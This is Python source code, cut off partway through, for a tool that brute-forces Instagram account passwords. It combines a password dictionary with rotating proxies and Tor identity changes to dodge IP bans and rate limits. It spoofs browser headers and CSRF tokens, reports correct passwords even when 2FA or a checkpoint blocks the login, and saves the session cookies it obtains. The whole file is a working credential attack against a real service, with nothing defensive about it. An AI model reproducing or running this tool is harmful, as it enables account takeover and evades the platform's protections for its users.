import asyncio
import aiohttp
import time
import sys
import json
import re
import random
import hashlib
import base64
import os
import statistics
import requests
import math
from typing import Optional, Dict, List, Tuple, Set, AsyncIterator
from dataclasses import dataclass, asdict
from pathlib import Path
import logging
from logging.handlers import RotatingFileHandler
from collections import defaultdict, deque
from cryptography.fernet import Fernet
from stem import Signal
from stem.control import Controller
from itertools import cycle, islice
from requests.exceptions import ProxyError, ConnectionError, Timeout, ChunkedEncodingError, SSLError
from pydantic import BaseModel, Field, model_validator

# Configure logging
def setup_logging(log_level="INFO", log_file="bruteforce.log", max_log_size=10, backup_count=5):
    """Setup logging with rotating file handler"""
    logger = logging.getLogger()
    logger.setLevel(getattr(logging, log_level))
    
    # Create formatter
    formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Setup rotating file handler
    file_handler = RotatingFileHandler(
        log_file,
        maxBytes=max_log_size * 1024 * 1024,
        backupCount=backup_count
    )
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)
    
    # Setup console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    
    return logger

@dataclass
class BruteForceResult:
    """Result of a brute force attempt"""
    success: bool
    password: str = ""
    message: str = ""
    response_data: Dict = None
    attempt_number: int = 0
    proxy_used: str = ""
    response_time: float = 0.0

class ResponseTimeTracker:
    """Track response times for logging and analysis"""
    def __init__(self):
        self.response_times = defaultdict(list)
    
    def add_response_time(self, endpoint: str, response_time: float):
        self.response_times[endpoint].append(response_time)
    
    def get_stats(self, endpoint: str) -> Dict:
        times = self.response_times.get(endpoint, [])
        if not times:
            return {"count": 0, "min": 0, "max": 0, "avg": 0, "p95": 0}
        
        # Safe calculation of percentile index
        p95_index = min(len(times) - 1, max(0, int(len(times) * 0.95) - 1))
        
        return {
            "count": len(times),
            "min": min(times),
            "max": max(times),
            "avg": statistics.mean(times),
            "p95": sorted(times)[p95_index]
        }
    
    def log_stats(self, logger: logging.Logger):
        """Log response time statistics"""
        logger.info("Response Time Statistics:")
        for endpoint, stats in self.response_times.items():
            endpoint_stats = self.get_stats(endpoint)
            logger.info(f"  {endpoint}: count={endpoint_stats['count']}, "
                       f"avg={endpoint_stats['avg']:.2f}s, "
                       f"min={endpoint_stats['min']:.2f}s, "
                       f"max={endpoint_stats['max']:.2f}s, "
                       f"p95={endpoint_stats['p95']:.2f}s")

class SessionPersistence:
    """Manage session persistence with encryption"""
    def __init__(self, encryption_key: Optional[bytes] = None):
        self.encryption_key = encryption_key or Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
    
    def save_session(self, session_data: Dict, file_path: str):
        """Save encrypted session data to file"""
        try:
            encrypted_data = self.cipher.encrypt(json.dumps(session_data).encode())
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
            return True
        except Exception as e:
            logging.error(f"Failed to save session: {str(e)}")
            return False
    
    def load_session(self, file_path: str) -> Optional[Dict]:
        """Load and decrypt session data from file"""
        try:
            if not os.path.exists(file_path):
                return None
                
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()
                
            decrypted_data = self.cipher.decrypt(encrypted_data)
            return json.loads(decrypted_data.decode())
        except Exception as e:
            logging.error(f"Failed to load session: {str(e)}")
            return None

class ProxyConfig(BaseModel):
    max_proxy_failures: int = Field(default=3, ge=1, le=10)
    proxy_file_path: Optional[str] = None
    test_timeout: int = Field(default=10, ge=5, le=60)
    max_workers: int = Field(default=10, ge=1, le=50)
    sample_size: Optional[int] = Field(default=50, ge=1)
    load_balancing: bool = Field(default=True)

class SessionConfig(BaseModel):
    max_retries: int = Field(default=3, ge=1, le=10)
    base_timeout: int = Field(default=30, ge=10, le=120)
    tor_password: Optional[str] = None
    user_agents: List[str] = Field(default_factory=lambda: [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
    ])
    session_persistence: bool = Field(default=True)
    exponential_backoff: bool = Field(default=True)

class LoggingConfig(BaseModel):
    log_level: str = Field(default="INFO", pattern=r"^(DEBUG|INFO|WARNING|ERROR|CRITICAL)$")
    log_file: str = Field(default="bruteforce.log")
    max_log_size: int = Field(default=10, ge=1, le=100)
    backup_count: int = Field(default=5, ge=1, le=20)
    log_response_times: bool = Field(default=True)
    generate_report: bool = Field(default=True)

class Config(BaseModel):
    username: str
    password_file: str
    connection_method: str = Field(default="proxy", pattern=r"^(tor|proxy|direct)$")
    encryption_method: str = Field(default="encrypted", pattern=r"^(encrypted|plaintext)$")
    proxy: ProxyConfig = Field(default_factory=ProxyConfig)
    session: SessionConfig = Field(default_factory=SessionConfig)
    logging: LoggingConfig = Field(default_factory=LoggingConfig)
    batch_size: int = Field(default=10, ge=1, le=50)
    
    @model_validator(mode='after')
    def validate_files(self) -> 'Config':
        """Validate that required files exist"""
        if not Path(self.password_file).exists():
            raise ValueError(f"Password file not found: {self.password_file}")
        
        if self.proxy.proxy_file_path is not None and not Path(self.proxy.proxy_file_path).exists():
            raise ValueError(f"Proxy file not found: {self.proxy.proxy_file_path}")
        
        return self
    
    @classmethod
    def load_from_file(cls, config_path: str) -> 'Config':
        """Load configuration from JSON file"""
        try:
            with open(config_path, 'r') as f:
                config_data = json.load(f)
            return cls(**config_data)
        except Exception as e:
            logging.error(f"Failed to load config from {config_path}: {str(e)}")
            raise

class AsyncProxyManager:
    """Enhanced proxy management with better error handling"""
    
    def __init__(self, config: Config):
        self.config = config
        self.proxies: List[str] = []
        self.proxy_failures: Dict[str, int] = {}
        self.proxy_response_times: Dict[str, float] = {}
        self.proxy_usage_count: Dict[str, int] = defaultdict(int)
        self.current_proxy: Optional[str] = None
        self.healthy_proxies: List[str] = []
        self.banned_proxies: Set[str] = set()
        self.response_tracker = ResponseTimeTracker()
        self.proxy_cycle = None
        self.proxy_queue = deque()
        self.lock = asyncio.Lock()
        self.consecutive_failures = 0
        self.last_proxy_refresh = 0
        
        if config.proxy.proxy_file_path:
            self.load_proxies(config.proxy.proxy_file_path)
    
    def load_proxies(self, proxy_file: str) -> bool:
        """Load and validate proxies from file"""
        proxy_path = Path(proxy_file)
        if not proxy_path.exists():
            logging.error(f"Proxy file '{proxy_file}' not found.")
            return False
        
        try:
            with open(proxy_path, 'r', encoding='utf-8') as f:
                raw_proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            # Validate proxy format
            self.proxies = []
            for proxy in raw_proxies:
                cleaned_proxy = proxy.split('#')[0].strip()
                if self._validate_proxy_format(cleaned_proxy):
                    self.proxies.append(cleaned_proxy)
                    self.proxy_failures[cleaned_proxy] = 0
                    self.proxy_response_times[cleaned_proxy] = float('inf')
                    self.proxy_usage_count[cleaned_proxy] = 0
                else:
                    logging.warning(f"Invalid proxy format: {proxy}")
            
            if not self.proxies:
                logging.error("No valid proxies found in proxy file.")
                return False
                
            self.proxy_cycle = cycle(self.proxies)
            self.proxy_queue = deque(self.proxies)
            self.current_proxy = next(self.proxy_cycle)
            
            logging.info(f"Loaded {len(self.proxies)} valid proxies")
            return True
        except Exception as e:
            logging.error(f"Error loading proxy file: {str(e)}")
            return False
    
    def _validate_proxy_format(self, proxy: str) -> bool:
        """Validate proxy format (IP:PORT or IP:PORT:USER:PASS)"""
        proxy = proxy.split('#')[0].strip()
        parts = proxy.split(':')
        if len(parts) < 2 or len(parts) > 4:
            return False
        
        try:
            if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+$|^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', parts[0]):
                return False
            
            port = int(parts[1])
            if not (1 <= port <= 65535):
                return False
            
            return True
        except (ValueError, IndexError):
            return False
    
    async def test_proxy(self, session: aiohttp.ClientSession, proxy: str) -> Tuple[bool, float]:
        """Test if proxy is working with Instagram"""
        cleaned_proxy = proxy.split('#')[0].strip()
        proxy_url = f"http://{cleaned_proxy}"
        
        try:
            start_time = time.time()
            async with session.get(
                'https://www.instagram.com/accounts/login/',
                proxy=proxy_url,
                timeout=5,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            ) as response:
                response_time = time.time() - start_time
                
                if response.status == 200:
                    self.proxy_response_times[cleaned_proxy] = response_time
                    self.response_tracker.add_response_time("proxy_test", response_time)
                    return True, response_time
        except Exception as e:
            logging.debug(f"Proxy {cleaned_proxy} failed test: {str(e)}")
        
        return False, float('inf')
    
    async def get_healthy_proxies(self) -> List[str]:
        """Test all proxies and return healthy ones"""
        current_time = time.time()
        if self.last_proxy_refresh > 0 and (current_time - self.last_proxy_refresh) < 600:
            return self.healthy_proxies
        
        self.last_proxy_refresh = current_time
        healthy = []
        
        proxies_to_test = self.proxies
        if self.config.proxy.sample_size and len(self.proxies) > self.config.proxy.sample_size:
            proxies_to_test = random.sample(self.proxies, self.config.proxy.sample_size)
        
        connector = aiohttp.TCPConnector(limit=5)
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [self.test_proxy(session, proxy) for proxy in proxies_to_test]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for proxy, result in zip(proxies_to_test, results):
                if isinstance(result, Exception):
                    logging.warning(f"Error testing proxy {proxy}: {str(result)}")
                    continue
                
                is_healthy, response_time = result
                if is_healthy and response_time < 10:
                    healthy.append(proxy)
                    logging.info(f"Proxy {proxy} is healthy (response time: {response_time:.2f}s)")
        
        self.healthy_proxies = sorted(healthy, key=lambda x: self.proxy_response_times[x])
        logging.info(f"Found {len(self.healthy_proxies)} healthy proxies")
        return self.healthy_proxies
    
    async def get_next_proxy(self) -> Optional[str]:
        """Get next available proxy"""
        if not self.proxies:
            return None
        
        async with self.lock:
            if self.healthy_proxies:
                available_proxies = [p for p in self.healthy_proxies 
                                   if p not in self.banned_proxies and 
                                   self.proxy_failures[p] < self.config.proxy.max_proxy_failures]
                
                if available_proxies:
                    best_proxy = min(available_proxies, 
                                    key=lambda x: (self.proxy_failures[x], 
                                                  self.proxy_response_times[x]))
                    self.proxy_usage_count[best_proxy] += 1
                    self.current_proxy = best_proxy
                    return best_proxy
            
            consecutive_skips = 0
            while consecutive_skips < len(self.proxies):
                if not self.proxy_queue:
                    self.proxy_queue = deque(self.proxies)
                
                next_proxy = self.proxy_queue.popleft()
                
                if (next_proxy not in self.banned_proxies and 
                    self.proxy_failures[next_proxy] < self.config.proxy.max_proxy_failures):
                    self.proxy_usage_count[next_proxy] += 1
                    self.current_proxy = next_proxy
                    return next_proxy
                consecutive_skips += 1
            
            logging.error("All proxies have exceeded maximum failures or are banned.")
            return None
    
    async def report_failure(self, proxy: Optional[str] = None, is_ban: bool = False):
        """Report proxy failure or ban"""
        proxy = proxy or self.current_proxy
        if proxy and proxy in self.proxy_failures:
            async with self.lock:
                self.consecutive_failures += 1
                if is_ban:
                    self.banned_proxies.add(proxy)
                    logging.warning(f"Proxy {proxy} has been banned by Instagram")
                else:
                    self.proxy_failures[proxy] += 1
                    logging.warning(f"Proxy failure count for {proxy}: {self.proxy_failures[proxy]}/{self.config.proxy.max_proxy_failures}")
                
                if self.consecutive_failures >= 3:
                    logging.info("Too many consecutive failures, refreshing healthy proxy list")
                    self.consecutive_failures = 0
                    await self.get_healthy_proxies()
    
    async def report_success(self, proxy: Optional[str] = None):
        """Report proxy success"""
        proxy = proxy or self.current_proxy
        if proxy and proxy in self.proxy_failures:
            async with self.lock:
                self.consecutive_failures = 0
                self.proxy_failures[proxy] = max(0, self.proxy_failures[proxy] - 1)

class SessionManager:
    """Enhanced session management with proper CSRF handling"""
    
    def __init__(self, config: Config, proxy_manager: Optional[AsyncProxyManager] = None, use_tor: bool = False):
        self.config = config
        self.proxy_manager = proxy_manager
        self.use_tor = use_tor
        self.session: Optional[requests.Session] = None
        self.csrf_token: Optional[str] = None
        self.connection_failures = 0
        self.roll_pid = self._generate_roll_pid()
        self.response_tracker = ResponseTimeTracker()
        self.last_csrf_refresh = 0
        self.use_direct_connection = False
        
    def _generate_roll_pid(self) -> str:
        """Generate a random roll_pid hash"""
        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
        return hashlib.md5(random_str.encode()).hexdigest()[:16]
    
    def create_session(self) -> requests.Session:
        """Create a new session with proper configuration"""
        self.session = requests.Session()
        
        # Configure proxies
        if self.use_direct_connection:
            self.session.proxies = {}
            logging.info("Using direct connection (no proxy)")
        elif self.use_tor:
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
        elif self.proxy_manager and self.proxy_manager.current_proxy:
            proxy = self.proxy_manager.current_proxy.split('#')[0].strip()
            proxy_dict = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            self.session.proxies = proxy_dict
            logging.info(f"Using proxy: {proxy}")
        else:
            self.session.proxies = {}
            logging.info("No proxy available, using direct connection")
        
        # Set headers
        self.session.headers.update({
            'User-Agent': random.choice(self.config.session.user_agents),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })
        
        return self.session
    
    def change_tor_identity(self) -> bool:
        """Change Tor identity to get a new IP"""
        try:
            with Controller.from_port(port=9051) as controller:
                if self.config.session.tor_password:
                    controller.authenticate(password=self.config.session.tor_password)
                else:
                    controller.authenticate()
                controller.signal(Signal.NEWNYM)
                logging.info("Changed Tor identity (new IP)")
                time.sleep(5)
                return True
        except Exception as e:
            logging.error(f"Failed to change Tor identity: {str(e)}")
            return False
    
    def get_csrf_token(self) -> bool:
        """
        Get CSRF token following browser-like behavior:
        1. Make GET request to login page
        2. Extract token from cookie
        3. Fallback to HTML extraction if needed
        """
        if not self.session:
            self.create_session()
        
        # Only refresh CSRF token if it's been more than 5 minutes since last refresh
        current_time = time.time()
        if self.csrf_token and (current_time - self.last_csrf_refresh) < 300:
            return True
        
        # Focus on the login page method as it's the most reliable
        url = 'https://www.instagram.com/accounts/login/'
        
        try:
            logging.debug(f"Getting CSRF token from: {url}")
            start_time = time.time()
            
            # Make GET request to get CSRF cookie
            response = self.session.get(url, timeout=10)
            response_time = time.time() - start_time
            
            if self.config.logging.log_response_times:
                self.response_tracker.add_response_time("csrf_login_page", response_time)
            
            if response.status_code == 200:
                # Primary method: Get token from cookie
                csrf_token = response.cookies.get('csrftoken')
                if csrf_token:
                    logging.debug(f"CSRF token found in cookies: {csrf_token}")
                    self.csrf_token = csrf_token
                    self.last_csrf_refresh = current_time
                    return True
                
                # Fallback: Extract from HTML
                csrf_token = self._extract_csrf_from_html(response.text)
                if csrf_token:
                    logging.debug(f"CSRF token found in HTML: {csrf_token}")
                    self.csrf_token = csrf_token
                    self.last_csrf_refresh = current_time
                    return True
            
            logging.error(f"Failed to get CSRF token. Status: {response.status_code}")
            return False
            
        except Exception as e:
            logging.error(f"Error getting CSRF token: {str(e)}")
            return False
    
    def _extract_csrf_from_html(self, html: str) -> Optional[str]:
        """Extract CSRF token from HTML"""
        patterns = [
            r'"csrf_token":"([^"]+)"',
            r'csrf_token":"([^"]+)"',
            r'name="csrfmiddlewaretoken" value="([^"]*)"',
            r'csrfmiddlewaretoken" value="([^"]*)"',
            r'"csrf_token": "([^"]+)"',
            r'window\._sharedData = ({.*?});',
            r'<script[^>]*>window\.__additionalDataLoaded\([^,]*,\s*({.*?})\);</script>',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                token = match.group(1)
                if token.startswith('{'):
                    try:
                        data = json.loads(token)
                        if 'config' in data and 'csrf_token' in data['config']:
                            return data['config']['csrf_token']
                        elif 'csrf_token' in data:
                            return data['csrf_token']
                    except json.JSONDecodeError:
                        continue
                return token
        return None
    
    async def make_request_with_retry(self, url: str, method: str = 'GET', 
                                    data: Dict = None, headers: Dict = None) -> Optional[requests.Response]:
        """Make request with intelligent retry"""
        if not self.session:
            self.create_session()
            
        retry_count = 0
        last_error = None
        base_delay = 1
        
        while retry_count < self.config.session.max_retries:
            try:
                request_headers = self.session.headers.copy()
                if headers:
                    request_headers.update(headers)
                
                start_time = time.time()
                if method.upper() == 'GET':
                    response = self.session.get(url, timeout=10, headers=request_headers)
                else:
                    response = self.session.post(url, data=data, timeout=10, 
                                               headers=request_headers, allow_redirects=False)
                response_time = time.time() - start_time
                
                if self.config.logging.log_response_times:
                    self.response_tracker.add_response_time(f"{method}_{url.split('/')[-2]}", response_time)
                
                # Reset connection failures on successful request
                self.connection_failures = 0
                if self.proxy_manager:
                    await self.proxy_manager.report_success()
                
                return response
                
            except (ProxyError, ConnectionError, Timeout, ChunkedEncodingError, SSLError) as e:
                last_error = e
                retry_count += 1
                self._handle_connection_error(e)
                
                if retry_count < self.config.session.max_retries:
                    delay = min(base_delay * (2 ** (retry_count - 1)) + random.uniform(0, 1), 30)
                    logging.info(f"Retrying in {delay:.1f} seconds... (Attempt {retry_count}/{self.config.session.max_retries})")
                    await asyncio.sleep(delay)
                    
                    await self._switch_connection_method()
        
        logging.error(f"Max retries exceeded. Last error: {str(last_error)}")
        return None
    
    def _handle_connection_error(self, error: Exception):
        """Handle connection errors"""
        self.connection_failures += 1
        error_type = type(error).__name__
        logging.warning(f"Connection error ({error_type}): {str(error)}")
        
        if self.proxy_manager:
            asyncio.create_task(self.proxy_manager.report_failure())
    
    async def _switch_connection_method(self):
        """Switch connection method on repeated failures"""
        if self.connection_failures >= 3 and not self.use_direct_connection:
            logging.warning("Multiple connection failures, switching to direct connection")
            self.use_direct_connection = True
            self.create_session()
            return
        
        if self.use_tor:
            self.change_tor_identity()
        elif self.proxy_manager and not self.use_direct_connection:
            new_proxy = await self.proxy_manager.get_next_proxy()
            if new_proxy:
                logging.info(f"Switching to proxy: {new_proxy}")
                self.create_session()
            else:
                logging.error("No working proxies available. Trying direct connection...")
                self.use_direct_connection = True
                self.create_session()

class InstagramBruteForcer:
    """Main brute force class with proper CSRF handling"""
    
    def __init__(self, config: Config, session_manager: SessionManager):
        self.config = config
        self.session_manager = session_manager
        self.attempts = 0
        self.successful_logins = []
        self.rate_limit_hit = False
        self.blocked_ips = set()
        self.response_tracker = ResponseTimeTracker()
        self.session_storage = SessionPersistence()
        self.last_attempt_time = 0
        
    def generate_password_variants(self, password: str) -> List[str]:
        """Generate different password format variants"""
        timestamp = int(time.time())
        
        if self.config.encryption_method == 'encrypted':
            variants = [
                f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
                f'#PWD_INSTAGRAM_BROWSER:10:{timestamp}:{password}',
                f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:0:{password}',
                f'#PWD_INSTAGRAM_BROWSER:1:{timestamp}:{password}',
                f'#PWD_INSTAGRAM_BROWSER:2:{timestamp}:{password}',
                password
            ]
        else:
            variants = [password]
        
        return variants
    
    def create_login_payload(self, username: str, password: str) -> Dict:
        """Create login payload with realistic data"""
        timestamp = int(time.time())
        device_id = hashlib.md5(f"{username}{timestamp}".encode()).hexdigest()
        
        return {
            'username': username,
            'enc_password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletion': 'false',
            'trustedDevice': 'false',
            'guid': device_id,
            'device_id': device_id,
            'rollout_hash': self.session_manager.roll_pid,
            'adid': hashlib.md5(f"{device_id}{timestamp}".encode()).hexdigest(),
            'waterfall_id': hashlib.md5(f"{timestamp}{random.randint(1000, 9999)}".encode()).hexdigest(),
            'fb_access_token': '',
            'fb_or_fbid': '',
            'next': '',
            'ig_sig_key_version': '4',
            'signed_body': f'SIGNATURE.{base64.b64encode(password.encode()).decode()}'
        }
    
    def create_login_headers(self) -> Dict:
        """Create realistic login headers with proper CSRF token"""
        headers = {
            'X-CSRFToken': self.session_manager.csrf_token,
            'X-Instagram-AJAX': '1007614293',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://www.instagram.com',
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'X-Asbd-Id': '129477',
            'X-IG-Device-ID': hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
            'X-Csrftoken': self.session_manager.csrf_token,  # Double-submit cookie pattern
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        return headers
    
    async def attempt_login(self, username: str, password: str) -> BruteForceResult:
        """Attempt login with proper CSRF handling"""
        self.attempts += 1
        proxy_used = "Direct" if self.session_manager.use_direct_connection else (
            self.session_manager.proxy_manager.current_proxy if self.session_manager.proxy_manager else "None"
        )
        
        # Rate limiting
        current_time = time.time()
        if self.last_attempt_time > 0:
            time_since_last = current_time - self.last_attempt_time
            min_delay = 2.0 if self.session_manager.use_direct_connection else 1.0
            if time_since_last < min_delay:
                await asyncio.sleep(min_delay - time_since_last)
        self.last_attempt_time = time.time()
        
        # Get fresh CSRF token if needed
        if self.attempts % 3 == 1 or not self.session_manager.csrf_token:
            if not self.session_manager.get_csrf_token():
                if not self.session_manager.use_direct_connection:
                    logging.warning("CSRF token failed, trying direct connection")
                    self.session_manager.use_direct_connection = True
                    self.session_manager.create_session()
                    if not self.session_manager.get_csrf_token():
                        return BruteForceResult(False, password, "Failed to get CSRF token with direct connection", 
                                              attempt_number=self.attempts, proxy_used=proxy_used)
                else:
                    return BruteForceResult(False, password, "Failed to get CSRF token", 
                                          attempt_number=self.attempts, proxy_used=proxy_used)
        
        headers = self.create_login_headers()
        login_data = self.create_login_payload(username, password)
        
        start_time = time.time()
        response = await self.session_manager.make_request_with_retry(
            'https://www.instagram.com/accounts/login/ajax/',
            method='POST',
            data=login_data,
            headers=headers
        )
        response_time = time.time() - start_time
        
        if self.config.logging.log_response_times:
            self.response_tracker.add_response_time("login_attempt", response_time)
        
        if not response:
            if not self.session_manager.use_direct_connection:
                logging.warning("No response received, trying direct connection")
                self.session_manager.use_direct_connection = True
                self.session_manager.create_session()
                
                if not self.session_manager.get_csrf_token():
                    return BruteForceResult(False, password, "Failed to get CSRF token with direct connection", 
                                          attempt_number=self.attempts, proxy_used=proxy_used, 
                                          response_time=response_time)
                
                headers = self.create_login_headers()
                start_time = time.time()
                response = await self.session_manager.make_request_with_retry(
                    'https://www.instagram.com/accounts/login/ajax/',
                    method='POST',
                    data=login_data,
                    headers=headers
                )
                response_time = time.time() - start_time
                
                if self.config.logging.log_response_times:
                    self.response_tracker.add_response_time("login_attempt_direct", response_time)
            
            if not response:
                return BruteForceResult(False, password, "No response received", 
                                      attempt_number=self.attempts, proxy_used=proxy_used, 
                                      response_time=response_time)
        
        return self._analyze_response(response, password, proxy_used, response_time)
    
    def _analyze_response(self, response: requests.Response, password: str, proxy_used: str, response_time: float) -> BruteForceResult:
        """Analyze login response"""
        try:
            if response.status_code == 200:
                json_data = response.json()
                
                # Successful login
                if json_data.get('authenticated') == True:
                    session_data = {
                        'cookies': dict(response.cookies),
                        'headers': dict(response.request.headers),
                        'timestamp': time.time()
                    }
                    self.session_storage.save_session(session_data, 'session.json')
                    
                    return BruteForceResult(True, password, "Login successful", 
                                          json_data, self.attempts, proxy_used, response_time)
                
                # Two-factor authentication required
                if json_data.get('two_factor_required') == True:
                    return BruteForceResult(True, password, "2FA required (password correct)", 
                                          json_data, self.attempts, proxy_used, response_time)
                
                # Checkpoint required
                if json_data.get('checkpoint_required') == True:
                    return BruteForceResult(True, password, "Checkpoint required (password correct)", 
                                          json_data, self.attempts, proxy_used, response_time)
                
                # Rate limiting - Fixed condition
                message = json_data.get('message', '').lower()
                if 'wait' in message or 'spam' in message:
                    self.rate_limit_hit = True
                    if self.session_manager.proxy_manager:
                        asyncio.create_task(self.session_manager.proxy_manager.report_failure(proxy_used, is_ban=True))
                    return BruteForceResult(False, password, f"Rate limited: {json_data.get('message', 'Unknown')}", 
                                          json_data, self.attempts, proxy_used, response_time)
                
                # Invalid credentials
                if json_data.get('user') == True and json_data.get('authenticated') == False:
                    return BruteForceResult(False, password, "Invalid password", 
                                          json_data, self.attempts, proxy_used, response_time)
                
                # IP block
                if 'ip_block' in message or response.headers.get('x-ig-set-www-claim') == '0':
                    if self.session_manager.proxy_manager:
                        asyncio.create_task(self.session_manager.proxy_manager.report_failure(proxy_used, is_ban=True))
                    return BruteForceResult(False, password, "IP blocked", 
                                          json_data, self.attempts, proxy_used, response_time)
                
                # Other errors
                message = json_data.get('message', 'Unknown error')
                return BruteForceResult(False, password, f"Login failed: {message}", 
                                      json_data, self.attempts, proxy_used, response_time)
            
            else:
                # HTTP 429 - Rate limited
                if response.status_code == 429:
                    self.rate_limit_hit = True
                    if self.session_manager.proxy_manager:
                        asyncio.create_task(self.session_manager.proxy_manager.report_failure(proxy_used, is_ban=True))
                    return BruteForceResult(False, password, "Rate limited (HTTP 429)", 
                                          attempt_number=self.attempts, proxy_used=proxy_used, 
                                          response_time=response_time)
                
                # HTTP 403 - Forbidden
                elif response.status_code == 403:
                    if self.session_manager.proxy_manager:
                        asyncio.create_task(self.session_manager.proxy_manager.report_failure(proxy_used, is_ban=True))
                    return BruteForceResult(False, password, "Access forbidden (HTTP 403)", 
                                          attempt_number=self.attempts, proxy_used=proxy_used, 
                                          response_time=response_time)
                
                return BruteForceResult(False, password, f"HTTP {response.status_code}", 
                                      attempt_number=self.attempts, proxy_used=proxy_used, 
                                      response_time=response_time)
                
        except json.JSONDecodeError:
            return BruteForceResult(False, password, "Invalid JSON response", 
                                  attempt_number=self.attempts, proxy_used=proxy_used, 
                                  response_time=response_time)
        except Exception as e:
            return BruteForceResult(False, password, f"Error analyzing response: {str(e)}", 
                                  attempt_number=self.attempts, proxy_used=proxy_used, 
                                  response_time=response_time)

class ReportGenerator:
    """Generate comprehensive reports with statistics"""
    
    def __init__(self, config: Config):
        self.config = config
        self.results = []
        self.start_time = None
        self.end_time = None
    
    def start_timing(self):
        """Start timing the brute force attack"""
        self.start_time = time.time()
    
    def end_timing(self):
        """End timing the brute force attack"""
        self.end_time = time.time()
    
    def add_result(self, result: BruteForceResult):
        """Add a result to the report"""
        self.results.append(result)
    
    def generate_report(self) -> Dict:
        """Generate a comprehensive report with statistics"""
        if not self.start_time or not self.end_time:
            return {"error": "Timing not started or ended"}
        
        total_time = self.end_time - self.start_time
        successful_attempts = [r for r in self.results if r.success]
        failed_attempts = [r for r in self.results if not r.success]
        
        success_rate = len(successful_attempts) / len(self.results) * 100 if self.results else 0
        
        response_times = [r.response_time for r in self.results if r.response_time > 0]
        response_time_stats = {
            "min": min(response_times) if response_times else 0,
            "max": max(response_times) if response_times else 0,
            "avg": statistics.mean(response_times) if response_times else 0,
            "p95": sorted(response_times)[min(len(response_times)-1, max(0, int(len(response_times) * 0.95) - 1))] if response_times else 0
        }
        
        proxy_stats = {}
        proxy_usage = defaultdict(list)
        proxy_success = defaultdict(int)
        proxy_failures = defaultdict(int)
        
        for result in self.results:
            if result.proxy_used != "None":
                proxy_usage[result.proxy_used].append(result.response_time)
                if result.success:
                    proxy_success[result.proxy_used] += 1
                else:
                    proxy_failures[result.proxy_used] += 1
        
        for proxy, times in proxy_usage.items():
            proxy_stats[proxy] = {
                "usage_count": len(times),
                "avg_response_time": statistics.mean(times) if times else 0,
                "success_rate": proxy_success[proxy] / (proxy_success[proxy] + proxy_failures[proxy]) * 100 if times else 0
            }
        
        # Guard against division by zero
        attempts_per_second = len(self.results) / total_time if total_time > 0.001 else 0
        
        report = {
            "summary": {
                "total_attempts": len(self.results),
                "successful_attempts": len(successful_attempts),
                "failed_attempts": len(failed_attempts),
                "success_rate": f"{success_rate:.2f}%",
                "total_time": f"{total_time:.2f} seconds",
                "attempts_per_second": attempts_per_second
            },
            "response_time_stats": response_time_stats,
            "proxy_performance": proxy_stats,
            "successful_passwords": [r.password for r in successful_attempts],
            "error_messages": list(set(r.message for r in failed_attempts))
        }
        
        return report
    
    def save_report(self, report: Dict, file_path: str):
        """Save report to JSON file"""
        try:
            with open(file_path, 'w') as f:
                json.dump(report, f, indent=2)
            logging.info(f"Report saved to {file_path}")
        except Exception as e:
            logging.error(f"Failed to save report: {str(e)}")

def load_passwords(dict_file: str) -> List[str]:
    """Load passwords from dictionary file"""
    try:
        dict_path = Path(dict_file)
        if not dict_path.exists():
            logging.error(f"Dictionary file '{dict_file}' not found.")
            return []
        
        with open(dict_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
